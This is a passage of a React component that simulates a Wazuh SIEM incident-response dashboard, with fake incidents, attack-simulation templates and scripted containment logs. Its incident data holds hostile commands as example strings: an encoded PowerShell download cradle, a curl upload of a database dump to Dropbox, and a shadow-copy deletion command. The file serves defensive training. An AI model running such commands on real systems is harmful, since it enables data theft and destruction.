import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Shield, ShieldAlert, ShieldCheck, Terminal, Activity, 
  Cpu, Server, User, Globe, RefreshCw, Play, CheckCircle2, 
  AlertTriangle, Search, Filter, Database, Hash, Lock, 
  Flame, Wifi, WifiOff, RefreshCw as ResetIcon, ArrowRight, CornerDownRight, X,
  ChevronRight, Info, Layers, Settings, Code, FileText, Check, AlertCircle
} from 'lucide-react';
import { useI18n } from '../../hooks/useI18n';

// Local translation dictionary for Wazuh Live Dashboard
const localI18n: Record<string, Record<string, string>> = {
  en: {
    title: "WAZUH SIEM & XDR ENGINE",
    subtitle: "Security Operations Center – Live Incident Response Dashboard",
    uptime: "Uptime",
    agents_status: "Agent Posture",
    total_agents: "Total Agents",
    active_agents: "Active",
    disconnected_agents: "Disconnected",
    alerts_summary: "Real-Time Alerts Summary",
    unresolved_incidents: "Critical Threats",
    total_logs: "Security Events Logged",
    mitigated_threats: "Mitigated Incidents",
    security_score: "Postured Rating",
    log_feed: "Live Alert Stream",
    search_placeholder: "Filter by agent, rule, level, CVE...",
    filter_all_agents: "All Agents",
    filter_critical_only: "Severity Level >= 10",
    header_timestamp: "Timestamp",
    header_agent: "Agent Name",
    header_alert: "Detection Rule & Impact Description",
    header_level: "Level",
    header_mitre: "MITRE ATT&CK",
    header_action: "Active Response Action",
    status_unresolved: "ACTIVE THREAT",
    status_mitigated: "MITIGATED",
    btn_active_response: "Run Containment",
    terminal_title: "Wazuh Active Response Console v4.7.2",
    terminal_disclaimer: "WARNING: Direct execution on production endpoint.",
    terminal_btn_close: "Close Console",
    terminal_btn_executing: "CONTAINING THREAT...",
    terminal_success: "THREAT MITIGATED SUCCESSFULLY",
    reset_simulation: "Reset Security State",
    agent_status_online: "ONLINE",
    agent_status_offline: "OFFLINE",
    mitre_tactic: "Tactic",
    simulate_attack: "SOC Attack Simulation Lab",
    trigger_ransomware: "Ransomware Attack",
    trigger_privesc: "SUID Privilege Escalation",
    trigger_exfil: "Dropbox Data Exfiltration",
    agent_diagnostics: "Diagnostics",
    details_title: "Wazuh Decoded Event JSON Payload",
    investigation_guide: "SOC Investigation Playbook",
    playbook_steps: "Playbook Steps & Analysis",
    pinging: "Pinging...",
    ping_result: "Telemetry Online",
    click_alert_tip: "Click on any alert to view decoded JSON document & SOC Playbook"
  },
  fr: {
    title: "MOTEUR WAZUH SIEM & XDR",
    subtitle: "Centre d'Opérations de Sécurité – Console de Réponse aux Incidents",
    uptime: "Temps d'activité",
    agents_status: "Posture des Agents",
    total_agents: "Total des Agents",
    active_agents: "Actifs",
    disconnected_agents: "Déconnectés",
    alerts_summary: "Résumé des Alertes en Temps Réel",
    unresolved_incidents: "Menaces Critiques",
    total_logs: "Événements de Sécurité Journalisés",
    mitigated_threats: "Incidents Atténués",
    security_score: "Évaluation de la Posture",
    log_feed: "Flux d'Alertes en Direct",
    search_placeholder: "Filtrer par agent, règle, niveau, CVE...",
    filter_all_agents: "Tous les Agents",
    filter_critical_only: "Niveau de Sévérité >= 10",
    header_timestamp: "Horodatage",
    header_agent: "Nom de l'Agent",
    header_alert: "Règle de Détection & Description de l'Impact",
    header_level: "Niveau",
    header_mitre: "MITRE ATT&CK",
    header_action: "Mesures de Réponse Active",
    status_unresolved: "MENACE ACTIVE",
    status_mitigated: "ATTÉNUÉ",
    btn_active_response: "Lancer le confinement",
    terminal_title: "Console de Réponse Active Wazuh v4.7.2",
    terminal_disclaimer: "ATTENTION : Exécution directe sur le point de terminaison.",
    terminal_btn_close: "Fermer la Console",
    terminal_btn_executing: "CONFINEMENT EN COURS...",
    terminal_success: "MENACE ATTÉNUÉE AVEC SUCCÈS",
    reset_simulation: "Réinitialiser l'état de sécurité",
    agent_status_online: "EN LIGNE",
    agent_status_offline: "HORS LIGNE",
    mitre_tactic: "Tactique",
    simulate_attack: "Lab de Simulation d'Attaque SOC",
    trigger_ransomware: "Attaque Ransomware",
    trigger_privesc: "Élévation de Privilège SUID",
    trigger_exfil: "Exfiltration Dropbox",
    agent_diagnostics: "Diagnostics",
    details_title: "Payload JSON de l'Événement Décodé Wazuh",
    investigation_guide: "Guide d'Enquête SOC",
    playbook_steps: "Étapes d'Enquête & Analyse",
    pinging: "Ping...",
    ping_result: "Télémétrie en ligne",
    click_alert_tip: "Cliquez sur une alerte pour voir le document JSON décodé et le playbook SOC"
  }
};

interface Incident {
  id: string;
  timestamp: string;
  agentName: string;
  agentIp: string;
  agentOs: string;
  ruleId: string;
  level: number;
  title: string;
  description: string;
  mitreTactic: string;
  mitreId: string;
  actionName: string;
  actionScript: string;
  status: 'unresolved' | 'mitigating' | 'mitigated';
  logs: string[];
}

const INITIAL_INCIDENTS: Incident[] = [
  {
    id: "inc-01",
    timestamp: "2026-06-30T23:41:12Z",
    agentName: "WIN-SRV-DC01",
    agentIp: "10.0.10.10",
    agentOs: "Windows Server 2022",
    ruleId: "100312",
    level: 15,
    title: "Credential Access via LSASS Memory Dump",
    description: "Mimikatz tool pattern detected attempting to read LSASS process memory to extract plain-text Domain Admin credentials.",
    mitreTactic: "Credential Access",
    mitreId: "T1003.001",
    actionName: "Isolate Host",
    actionScript: "ar-isolate-host.ps1",
    status: 'unresolved',
    logs: [
      "[+] Initiating secure agent communication channel...",
      "[+] Verifying payload integrity (SHA256 hash valid)...",
      "[+] Loading script: Active-Response/win-isolate-nic.ps1",
      "[i] Executing PowerShell cmdlet on agent WIN-SRV-DC01:",
      "    > New-NetFirewallRule -DisplayName 'Wazuh Emergency Isolation' -Direction Outbound -Action Block -Enabled True",
      "    > New-NetFirewallRule -DisplayName 'Wazuh Emergency Isolation In' -Direction Inbound -Action Block -Enabled True",
      "[+] Rule created. All non-Wazuh TCP/UDP network sockets blocked.",
      "[+] Disabling auxiliary NIC interfaces...",
      "[+] Isolate command executed successfully.",
      "[i] Host state transitioned: CONNECTED -> ISOLATED."
    ]
  },
  {
    id: "inc-02",
    timestamp: "2026-06-30T23:42:05Z",
    agentName: "UBUNTU-WEB01",
    agentIp: "192.168.1.150",
    agentOs: "Ubuntu 22.04 LTS",
    ruleId: "5716",
    level: 12,
    title: "SSHD Authentication Brute Force Attack",
    description: "Multiple failed root logins detected over SSH from external IP 185.220.101.5 within 30 seconds. Potential high-intensity brute force.",
    mitreTactic: "Credential Access",
    mitreId: "T1110.001",
    actionName: "Block Attacker IP",
    actionScript: "ar-block-ip.sh",
    status: 'unresolved',
    logs: [
      "[+] Target Linux system: UBUNTU-WEB01 identified.",
      "[+] Retrieving firewall subsystem type (iptables / nftables)...",
      "[i] Executing command as root on target:",
      "    > iptables -A INPUT -s 185.220.101.5 -j DROP",
      "    > ufw route deny from 185.220.101.5",
      "[+] Threat IP 185.220.101.5 successfully blocked in kernel IP filter tables.",
      "[+] Adding network socket drop rule to SSH wrapper configs...",
      "[+] Local rule update propagated to all auxiliary routers.",
      "[SUCCESS] Attacking IP blocked. SSH brute force activity halted."
    ]
  },
  {
    id: "inc-03",
    timestamp: "2026-06-30T23:43:18Z",
    agentName: "WIN-LAPTOP-02",
    agentIp: "10.0.10.88",
    agentOs: "Windows 11 Enterprise",
    ruleId: "100450",
    level: 11,
    title: "Suspicious Base64 PowerShell Download Cradle",
    description: "Sysmon event detected encoded process launch downloading an external web request from an unverified public pastebin endpoint.",
    mitreTactic: "Execution",
    mitreId: "T1059.001",
    actionName: "Kill Process Tree",
    actionScript: "ar-kill-process.ps1",
    status: 'unresolved',
    logs: [
      "[+] Connecting to device WIN-LAPTOP-02 session...",
      "[+] Mapping Sysmon Process GUID: {3F2504E0-5789-60E2-A201-00000000F431}",
      "[i] Querying operational process details...",
      "    PID: 12048 | Parent PID: 4012 (cmd.exe) | Shell: powershell.exe",
      "[i] Target threat binary: powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...",
      "[!] Terminating malicious process GUID and spawned child processes...",
      "    > Stop-Process -Id 12048 -Force",
      "    > Stop-Process -Id 12049 -Force",
      "[+] Process terminated. Memory handles cleared from registry.",
      "[SUCCESS] Active process tree terminated. Potential reverse shell prevented."
    ]
  }
];

const ATTACK_TEMPLATES: Record<string, Omit<Incident, 'id' | 'timestamp' | 'status'>> = {
  ransomware: {
    agentName: "WIN-SRV-DC01",
    agentIp: "10.0.10.10",
    agentOs: "Windows Server 2022",
    ruleId: "100520",
    level: 14,
    title: "Ransomware Behavior - Volume Shadow Copy Deletion",
    description: "Vssadmin command launched to delete Volume Shadow Copies, followed by multiple rapid file extension renames to .locked. Potential active ransomware deployment.",
    mitreTactic: "Impact",
    mitreId: "T1490",
    actionName: "Isolate DC & Stop AD Share",
    actionScript: "ar-stop-vss-tampering.ps1",
    logs: [
      "[+] Active emergency trigger on agent WIN-SRV-DC01.",
      "[+] Confirming VSS tampering patterns...",
      "[!] Process 'vssadmin.exe delete shadows /all /quiet' detected with high severity.",
      "[+] Initiating active response containment playbook...",
      "[i] Disabling Active Directory network file shares instantly...",
      "    > Stop-Service -Name LanmanServer -Force",
      "[+] Isolating endpoint NIC and blocking incoming NetBIOS traffic...",
      "    > New-NetFirewallRule -DisplayName 'Block Ransomware SMB' -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block",
      "[SUCCESS] Network share service stopped. SMB file propagation locked. Threat contained."
    ]
  },
  privesc: {
    agentName: "UBUNTU-WEB01",
    agentIp: "192.168.1.150",
    agentOs: "Ubuntu 22.04 LTS",
    ruleId: "5722",
    level: 13,
    title: "Privilege Escalation via SUID Binary Abuse",
    description: "Local user executed an unprivileged system shell using a custom-modified SUID binary with root privileges. Potential privilege escalation.",
    mitreTactic: "Privilege Escalation",
    mitreId: "T1548.001",
    actionName: "Revoke Root Shell",
    actionScript: "ar-revoke-suid.sh",
    logs: [
      "[+] Analyzing local command execution history on UBUNTU-WEB01...",
      "[!] Detected interactive shell spawned from custom SUID wrapper in /tmp/...",
      "[+] Initiating active response...",
      "[i] Terminating process shell PID 31054...",
      "    > kill -9 31054",
      "[i] Revoking suspicious SUID permissions across temporary directories...",
      "    > chmod -s /tmp/suid_exploit",
      "    > rm -f /tmp/suid_exploit",
      "[SUCCESS] Malicious session terminated and SUID backdoor files expunged."
    ]
  },
  dataintel: {
    agentName: "MAC-WORKSTATION",
    agentIp: "192.168.1.160",
    agentOs: "macOS Sonoma",
    ruleId: "92210",
    level: 12,
    title: "Exfiltration - Suspicious Cloud Sync Data Upload",
    description: "Agent monitored a large compressed backup payload (.zip archive containing customer database rows) uploading to a non-corporate Dropbox endpoint via curl.",
    mitreTactic: "Exfiltration",
    mitreId: "T1567.002",
    actionName: "Block Sync Connection",
    actionScript: "ar-block-exfil.sh",
    logs: [
      "[+] Intercepting network traffic on MAC-WORKSTATION...",
      "[!] Outbound connection detected to api.dropboxapi.com matching sensitive tags.",
      "[+] Initiating connection teardown script...",
      "[i] Locating active curl/rclone process handles...",
      "    PID: 8042 | Command: curl -X POST --data-binary @db_dump.zip https://content.dropboxapi.com/...",
      "[i] Terminating exfiltration thread and updating endpoint host file rules...",
      "    > kill -9 8042",
      "    > echo '127.0.0.1 api.dropboxapi.com' >> /etc/hosts",
      "[SUCCESS] Exfiltration connection dropped instantly. Dropbox API blocked on workstation."
    ]
  }
};

export const WazuhIncidentResponseDashboard: React.FC = () => {
  const { language } = useI18n();
  const currentLang = language === 'fr' ? 'fr' : 'en';
  const text = localI18n[currentLang];

  // States
  const [incidents, setIncidents] = useState<Incident[]>(INITIAL_INCIDENTS);
  const [totalLogs, setTotalLogs] = useState<number>(1420);
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [selectedAgentFilter, setSelectedAgentFilter] = useState<string>('all');
  const [criticalFilterOnly, setCriticalFilterOnly] = useState<boolean>(false);
  
  // Active Terminal states
  const [activeTerminalIncident, setActiveTerminalIncident] = useState<Incident | null>(null);
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
  const [isTerminalRunning, setIsTerminalRunning] = useState<boolean>(false);
  const [terminalLineIndex, setTerminalLineIndex] = useState<number>(0);

  // Enhanced SOC States
  const [selectedDetailIncident, setSelectedDetailIncident] = useState<Incident | null>(null);
  const [pingingAgentId, setPingingAgentId] = useState<string | null>(null);
  const [agentPingResult, setAgentPingResult] = useState<Record<string, string>>({});

  // Simulated static data
  const agents = [
    { id: '001', name: 'WIN-SRV-DC01', ip: '10.0.10.10', os: 'Windows Server', status: 'online' },
    { id: '002', name: 'UBUNTU-WEB01', ip: '192.168.1.150', os: 'Linux (Ubuntu)', status: 'online' },
    { id: '003', name: 'WIN-LAPTOP-02', ip: '10.0.10.88', os: 'Windows 11', status: 'online' },
    { id: '004', name: 'MAC-WORKSTATION', ip: '192.168.1.160', os: 'macOS Sonoma', status: 'online' },
    { id: '005', name: 'HONEYPOT-DECOY', ip: '10.0.20.25', os: 'Linux (Debian)', status: 'offline' },
  ];

  // Increment total logs dynamically to simulate live security event streaming
  useEffect(() => {
    const logInterval = setInterval(() => {
      setTotalLogs(prev => prev + Math.floor(Math.random() * 3) + 1);
    }, 4000);
    return () => clearInterval(logInterval);
  }, []);

  // Compute stats
  const unresolvedCount = incidents.filter(i => i.status !== 'mitigated').length;
  const mitigatedCount = incidents.filter(i => i.status === 'mitigated').length;
  
  // Calculate dynamic security posture score
  // Initial (3 unresolved): 65%. 1 resolved: 76%. 2 resolved: 88%. 3 resolved: 100%
  const securityScore = unresolvedCount === 3 ? 65 
                      : unresolvedCount === 2 ? 78 
                      : unresolvedCount === 1 ? 90 
                      : 100;

  // Filtered Incidents
  const filteredIncidents = incidents.filter(inc => {
    const matchesSearch = 
      inc.agentName.toLowerCase().includes(searchQuery.toLowerCase()) ||
      inc.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
      inc.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
      inc.mitreTactic.toLowerCase().includes(searchQuery.toLowerCase()) ||
      inc.mitreId.toLowerCase().includes(searchQuery.toLowerCase()) ||
      inc.ruleId.includes(searchQuery);

    const matchesAgent = selectedAgentFilter === 'all' || inc.agentName === selectedAgentFilter;
    const matchesSeverity = !criticalFilterOnly || inc.level >= 10;

    return matchesSearch && matchesAgent && matchesSeverity;
  });

  // Launch Active Response terminal
  const runActiveResponse = (incident: Incident) => {
    if (incident.status === 'mitigated' || isTerminalRunning) return;
    
    // Set incident status to mitigating
    setIncidents(prev => prev.map(i => i.id === incident.id ? { ...i, status: 'mitigating' } : i));
    
    // Open terminal window
    setActiveTerminalIncident(incident);
    setTerminalLogs([`[i] INITIALIZING WAZUH ACTIVE RESPONSE ENGINE FOR INCIDENT ID: ${incident.id}`]);
    setIsTerminalRunning(true);
    setTerminalLineIndex(0);
  };

  // Run terminal line simulation
  useEffect(() => {
    if (!isTerminalRunning || !activeTerminalIncident) return;

    if (terminalLineIndex < activeTerminalIncident.logs.length) {
      const timeout = setTimeout(() => {
        setTerminalLogs(prev => [...prev, activeTerminalIncident.logs[terminalLineIndex]]);
        setTerminalLineIndex(prev => prev + 1);
      }, 700 + Math.random() * 600); // Randomized delayed terminal typing feel
      return () => clearTimeout(timeout);
    } else {
      // Completed response script
      const timeout = setTimeout(() => {
        setTerminalLogs(prev => [...prev, `[SUCCESS] RESPONSE ACTION COMPLETED successfully.`, `[+] Active alert resolved.`]);
        setIsTerminalRunning(false);
        setIncidents(prev => prev.map(i => i.id === activeTerminalIncident.id ? { ...i, status: 'mitigated' } : i));
      }, 800);
      return () => clearTimeout(timeout);
    }
  }, [isTerminalRunning, terminalLineIndex, activeTerminalIncident]);

  const triggerAttack = (type: 'ransomware' | 'privesc' | 'dataintel') => {
    const template = ATTACK_TEMPLATES[type];
    if (!template) return;

    const randomId = `inc-sim-${Math.floor(Math.random() * 900) + 100}`;
    const nowUtc = new Date().toISOString().replace(/\.\d+Z$/, 'Z');

    const newIncident: Incident = {
      ...template,
      id: randomId,
      timestamp: nowUtc,
      status: 'unresolved'
    };

    setIncidents(prev => [newIncident, ...prev]);
    setTotalLogs(prev => prev + 24);
    
    // Auto-select the newly spawned incident so the analyst sees it immediately!
    setSelectedDetailIncident(newIncident);
  };

  const pingAgent = (agentId: string) => {
    if (pingingAgentId) return;
    setPingingAgentId(agentId);
    
    setTimeout(() => {
      setAgentPingResult(prev => ({
        ...prev,
        [agentId]: `OK | RTT 4.2ms | Loss: 0%`
      }));
      setPingingAgentId(null);
    }, 1200);
  };

  // Reset simulation back to active threat state
  const handleReset = () => {
    setIncidents(INITIAL_INCIDENTS.map(i => ({ ...i, status: 'unresolved' })));
    setTotalLogs(1420);
    setActiveTerminalIncident(null);
    setSelectedDetailIncident(null);
    setIsTerminalRunning(false);
    setTerminalLogs([]);
    setTerminalLineIndex(0);
    setAgentPingResult({});
    setPingingAgentId(null);
  };

  return (
    <div className="flex h-full w-full flex-col bg-[#05070e] font-sans text-slate-100 select-none overflow-y-auto">
      {/* Top Banner / SIEM Header */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between border-b border-white/5 bg-[#090d16] px-5 py-4 gap-4 shrink-0">
        <div className="flex items-center gap-3">
          <div className="relative flex h-10 w-10 items-center justify-center rounded-lg bg-red-950/40 border border-red-500/30 text-red-500 shadow-[0_0_15px_rgba(239,68,68,0.25)] animate-pulse">
            <Flame size={20} />
          </div>
          <div>
            <h1 className="text-sm font-black tracking-widest text-[#26F0C4] font-mono flex items-center gap-2">
              {text.title} 
              <span className="text-[10px] bg-slate-800 text-slate-400 px-1.5 py-0.5 rounded border border-white/5">v4.7.2</span>
            </h1>
            <p className="text-[11px] font-medium text-slate-400 mt-0.5">{text.subtitle}</p>
          </div>
        </div>

        {/* Dynamic status indicators */}
        <div className="flex flex-wrap items-center gap-4 text-xs font-mono">
          <div className="flex items-center gap-2 bg-[#0d1525] border border-white/5 px-3 py-1.5 rounded-lg">
            <span className="flex h-2 w-2 rounded-full bg-[#26F0C4] animate-ping" />
            <span className="text-slate-400">{text.uptime}:</span>
            <span className="text-[#26F0C4] font-bold">04:12:44</span>
          </div>

          <button 
            onClick={handleReset}
            className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-950/30 hover:bg-red-950/50 text-red-400 border border-red-500/20 text-xs font-bold transition-all cursor-pointer hover:border-red-500/40"
          >
            <ResetIcon size={12} />
            <span>{text.reset_simulation}</span>
          </button>
        </div>
      </div>

      {/* Grid: Overview Indicators & Agent Posture */}
      <div className="grid grid-cols-1 md:grid-cols-4 border-b border-white/5 bg-[#070b13] shrink-0">
        
        {/* Metric 1: Security logs ingested */}
        <div className="p-5 border-r border-b md:border-b-0 border-white/5 flex flex-col justify-between">
          <div className="flex items-center justify-between text-slate-400 text-xs font-mono font-bold tracking-wider">
            <span>{text.total_logs}</span>
            <Database size={14} className="text-blue-400" />
          </div>
          <div className="mt-3 flex items-baseline gap-2">
            <span className="text-3xl font-black tracking-tight text-white font-mono">{totalLogs}</span>
            <span className="text-[10px] text-emerald-400 font-mono font-black">+1.8k/hr</span>
          </div>
          <p className="text-[10px] text-slate-500 mt-1">Collecting telemetry from all 5 agents</p>
        </div>

        {/* Metric 2: Critical alerts active */}
        <div className="p-5 border-r border-b md:border-b-0 border-white/5 flex flex-col justify-between">
          <div className="flex items-center justify-between text-slate-400 text-xs font-mono font-bold tracking-wider">
            <span>{text.unresolved_incidents}</span>
            <ShieldAlert size={14} className="text-red-400" />
          </div>
          <div className="mt-3 flex items-baseline gap-2">
            <span className={`text-3xl font-black tracking-tight font-mono ${unresolvedCount > 0 ? "text-red-500" : "text-emerald-400"}`}>
              {unresolvedCount}
            </span>
            {unresolvedCount > 0 && (
              <span className="text-[10px] text-red-500 bg-red-950/40 border border-red-500/20 px-1.5 py-0.5 rounded animate-pulse font-mono font-black">
                CRITICAL
              </span>
            )}
          </div>
          <p className="text-[10px] text-slate-500 mt-1">Immediate response suggested</p>
        </div>

        {/* Metric 3: Mitigated threats */}
        <div className="p-5 border-r border-b md:border-b-0 border-white/5 flex flex-col justify-between">
          <div className="flex items-center justify-between text-slate-400 text-xs font-mono font-bold tracking-wider">
            <span>{text.mitigated_threats}</span>
            <ShieldCheck size={14} className="text-emerald-400" />
          </div>
          <div className="mt-3 flex items-baseline gap-2">
            <span className="text-3xl font-black tracking-tight text-[#26F0C4] font-mono">{mitigatedCount}</span>
            <span className="text-[10px] text-[#26F0C4] font-mono">/ 3</span>
          </div>
          <p className="text-[10px] text-slate-500 mt-1">Active response script blocks</p>
        </div>

        {/* Metric 4: Health Score Rating */}
        <div className="p-5 flex flex-col justify-between bg-[#0b101d]/35">
          <div className="flex items-center justify-between text-slate-400 text-xs font-mono font-bold tracking-wider">
            <span>{text.security_score}</span>
            <Activity size={14} className="text-[#26F0C4]" />
          </div>
          <div className="mt-3 flex items-center gap-3">
            <span className={`text-3xl font-black tracking-tight font-mono ${securityScore === 100 ? "text-emerald-400" : securityScore >= 80 ? "text-amber-400" : "text-red-400"}`}>
              {securityScore}%
            </span>
            <div className="flex-1 bg-slate-800 h-2 rounded-full overflow-hidden border border-white/5">
              <div 
                className={`h-full rounded-full transition-all duration-700 ${securityScore === 100 ? "bg-emerald-400" : securityScore >= 80 ? "bg-amber-400" : "bg-red-500"}`}
                style={{ width: `${securityScore}%` }}
              />
            </div>
          </div>
          <p className="text-[10px] text-slate-400 font-medium font-mono">
            STATUS: {securityScore === 100 ? "SECURE" : "EXPOSED"}
          </p>
        </div>
      </div>

      {/* Main Grid: Left Side Charts & Agent Roster, Right Side Live Alerts */}
      <div className="flex-1 flex flex-col lg:grid lg:grid-cols-12 min-h-0 divide-y lg:divide-y-0 lg:divide-x divide-white/5 overflow-hidden">
        
        {/* Left column (col-span-4): Agent Status List & Ingest Speed */}
        <div className="lg:col-span-4 flex flex-col min-h-0 overflow-y-auto p-4 sm:p-5 gap-5">
          
          {/* Agent status block */}
          <div className="border border-white/5 bg-[#080d16] rounded-xl p-4">
            <h2 className="text-xs font-bold font-mono tracking-wider text-[#26F0C4] uppercase border-b border-white/5 pb-2.5 mb-3 flex items-center justify-between">
              <span>{text.agents_status}</span>
              <span className="text-[10px] text-slate-400 font-mono font-normal">Active telemetry</span>
            </h2>

            <div className="space-y-2.5">
              {agents.map(agent => (
                <div key={agent.id} className="flex flex-col bg-slate-950/40 border border-white/5 rounded-lg p-2.5 hover:bg-slate-900/40 transition-colors gap-2">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2.5">
                      <Server size={14} className="text-slate-400" />
                      <div>
                        <div className="text-xs font-black font-mono text-white">{agent.name}</div>
                        <div className="text-[10px] text-slate-500 font-mono mt-0.5">{agent.ip} • {agent.os}</div>
                      </div>
                    </div>

                    <div className="flex items-center gap-1.5 bg-slate-900 px-2 py-1 rounded border border-white/5">
                      <span className={`h-1.5 w-1.5 rounded-full ${agent.status === 'online' ? "bg-emerald-500" : "bg-slate-600 animate-pulse"}`} />
                      <span className="text-[9px] font-black font-mono text-slate-400 uppercase">
                        {agent.status === 'online' ? text.agent_status_online : text.agent_status_offline}
                      </span>
                    </div>
                  </div>

                  {agent.status === 'online' && (
                    <div className="flex items-center justify-between pt-1 border-t border-white/5 text-[10px] font-mono">
                      <span className="text-slate-500">{text.agent_diagnostics}:</span>
                      {pingingAgentId === agent.id ? (
                        <span className="text-[#26F0C4] animate-pulse flex items-center gap-1">
                          <RefreshCw size={10} className="animate-spin" />
                          <span>{text.pinging}</span>
                        </span>
                      ) : agentPingResult[agent.id] ? (
                        <span className="text-emerald-400 flex items-center gap-1 text-[9px]">
                          <Check size={10} />
                          <span>{agentPingResult[agent.id]}</span>
                        </span>
                      ) : (
                        <button
                          onClick={() => pingAgent(agent.id)}
                          className="text-[#26F0C4] hover:underline cursor-pointer font-bold text-[9px] uppercase tracking-wider bg-white/5 hover:bg-[#26F0C4]/10 px-1.5 py-0.5 rounded transition-all border border-[#26F0C4]/10"
                        >
                          Run Check
                        </button>
                      )}
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>

          {/* Custom animated Mini-Inbound-Telemetry line-chart */}
          <div className="border border-white/5 bg-[#080d16] rounded-xl p-4 flex-1 flex flex-col min-h-[160px]">
            <h2 className="text-xs font-bold font-mono tracking-wider text-[#26F0C4] uppercase border-b border-white/5 pb-2.5 mb-3 flex items-center justify-between">
              <span>Telemetry Load Ingestion</span>
              <span className="text-[10px] text-emerald-400 font-mono font-bold">LIVE (450 eps)</span>
            </h2>

            <div className="flex-1 flex items-end gap-1.5 h-24 pt-4 px-2 select-none relative">
              {/* Overlay grid lines */}
              <div className="absolute inset-0 flex flex-col justify-between pointer-events-none border-b border-white/5 pb-1">
                <div className="border-b border-white/5 w-full h-0 text-[8px] font-mono text-slate-600 pt-1">900 eps</div>
                <div className="border-b border-white/5 w-full h-0 text-[8px] font-mono text-slate-600">500 eps</div>
                <div className="w-full h-0 text-[8px] font-mono text-slate-600">100 eps</div>
              </div>

              {/* Animated Custom Bars simulating CPU or network load graphs */}
              <div className="w-full flex items-end justify-between h-full z-10">
                {[55, 62, 44, 78, 85, 49, 63, 72, 90, 81, 68, 92, 74, 55, 61, 89, 95].map((val, idx) => (
                  <motion.div
                    key={idx}
                    className="w-full max-w-[8px] bg-gradient-to-t from-emerald-500/30 to-emerald-400 rounded-t-sm"
                    initial={{ height: 0 }}
                    animate={{ height: `${val}%` }}
                    transition={{
                      repeat: Infinity,
                      repeatType: "reverse",
                      duration: 0.8 + idx * 0.05,
                      ease: "easeInOut"
                    }}
                  />
                ))}
              </div>
            </div>

            <div className="mt-3 flex items-center justify-between text-[10px] font-mono text-slate-500 pt-2 border-t border-white/5">
              <span>05s ago</span>
              <span>01s ago</span>
              <span>Live stream</span>
            </div>
          </div>

          {/* SOC Attack Simulation Lab Panel */}
          <div className="border border-white/5 bg-[#080d16] rounded-xl p-4">
            <h2 className="text-xs font-bold font-mono tracking-wider text-red-400 uppercase border-b border-white/5 pb-2.5 mb-3 flex items-center justify-between">
              <span className="flex items-center gap-1.5">
                <Flame size={13} className="animate-pulse" />
                <span>{text.simulate_attack}</span>
              </span>
              <span className="text-[9px] bg-red-950 text-red-400 border border-red-500/20 px-1.5 py-0.5 rounded">
                SEC_LAB
              </span>
            </h2>

            <div className="grid grid-cols-1 gap-2">
              <button
                onClick={() => triggerAttack('ransomware')}
                className="w-full flex items-center justify-between bg-red-950/10 hover:bg-red-950/20 text-slate-300 hover:text-red-400 border border-red-500/10 hover:border-red-500/30 rounded-lg p-2.5 text-xs font-mono transition-all cursor-pointer text-left"
              >
                <div className="flex items-center gap-2">
                  <Lock size={12} className="text-red-400 shrink-0" />
                  <div>
                    <div className="font-bold text-[11px] text-white">{text.trigger_ransomware}</div>
                    <div className="text-[9px] text-slate-500 mt-0.5">Target: WIN-SRV-DC01 | Severity 14</div>
                  </div>
                </div>
                <ArrowRight size={12} className="opacity-60 shrink-0" />
              </button>

              <button
                onClick={() => triggerAttack('privesc')}
                className="w-full flex items-center justify-between bg-amber-950/10 hover:bg-amber-950/20 text-slate-300 hover:text-amber-400 border border-amber-500/10 hover:border-amber-500/30 rounded-lg p-2.5 text-xs font-mono transition-all cursor-pointer text-left"
              >
                <div className="flex items-center gap-2">
                  <ShieldAlert size={12} className="text-amber-400 shrink-0" />
                  <div>
                    <div className="font-bold text-[11px] text-white">{text.trigger_privesc}</div>
                    <div className="text-[9px] text-slate-500 mt-0.5">Target: UBUNTU-WEB01 | Severity 13</div>
                  </div>
                </div>
                <ArrowRight size={12} className="opacity-60 shrink-0" />
              </button>

              <button
                onClick={() => triggerAttack('dataintel')}
                className="w-full flex items-center justify-between bg-blue-950/10 hover:bg-blue-950/20 text-slate-300 hover:text-blue-400 border border-blue-500/10 hover:border-blue-500/30 rounded-lg p-2.5 text-xs font-mono transition-all cursor-pointer text-left"
              >
                <div className="flex items-center gap-2">
                  <Globe size={12} className="text-blue-400 shrink-0" />
                  <div>
                    <div className="font-bold text-[11px] text-white">{text.trigger_exfil}</div>
                    <div className="text-[9px] text-slate-500 mt-0.5">Target: MAC-WORKSTATION | Severity 12</div>
                  </div>
                </div>
                <ArrowRight size={12} className="opacity-60 shrink-0" />
              </button>
            </div>
          </div>
        </div>

        {/* Right column (col-span-8): Interactive alert console & feed list */}
        <div className="lg:col-span-8 flex flex-col min-h-0 overflow-hidden bg-slate-950/40">
          
          {/* Header & Filters search */}
          <div className="p-4 border-b border-white/5 flex flex-col sm:flex-row items-center justify-between gap-3 bg-[#070b13]/60 shrink-0">
            <h2 className="text-xs font-mono font-black tracking-widest text-[#26F0C4] uppercase flex items-center gap-2">
              <Activity size={12} />
              <span>{text.log_feed}</span>
            </h2>

            {/* Filters Row */}
            <div className="flex flex-wrap items-center gap-2.5 w-full sm:w-auto">
              {/* Search input field */}
              <div className="flex items-center gap-2 border border-white/5 bg-[#05070c] px-2.5 py-1.5 rounded-lg text-xs font-mono w-full sm:w-60">
                <Search size={12} className="text-slate-500" />
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder={text.search_placeholder}
                  className="bg-transparent text-slate-300 border-none outline-none w-full text-[11px] placeholder:text-slate-600 focus:ring-0 focus:outline-none"
                />
                {searchQuery && (
                  <button 
                    onClick={() => setSearchQuery('')}
                    className="text-slate-500 hover:text-slate-300 font-bold px-1"
                  >
                    ×
                  </button>
                )}
              </div>

              {/* Agent Filter Dropdown */}
              <div className="flex items-center gap-1 border border-white/5 bg-[#05070c] px-2 py-1.5 rounded-lg text-xs font-mono">
                <Filter size={10} className="text-slate-500" />
                <select
                  value={selectedAgentFilter}
                  onChange={(e) => setSelectedAgentFilter(e.target.value)}
                  className="bg-transparent text-slate-300 border-none outline-none cursor-pointer text-[11px] font-bold"
                >
